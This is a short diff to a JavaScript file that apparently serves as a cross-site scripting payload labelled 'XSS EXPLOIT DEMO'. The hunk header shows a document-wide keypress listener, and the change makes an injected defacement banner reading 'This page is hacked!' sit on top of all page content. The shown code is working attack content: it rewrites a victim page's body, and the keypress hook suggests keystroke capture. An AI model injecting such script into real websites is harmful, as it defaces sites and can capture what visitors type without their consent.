@@ -10,7 +10,7 @@ document.addEventListener('keypress', (e) => {
 
 // Deface the webpage (visible demonstration)
 document.body.innerHTML += `
-  <div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:10px;">
+  <div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:10px;z-index:9999;">
     XSS EXPLOIT DEMO: This page is hacked!
   </div>
 `;
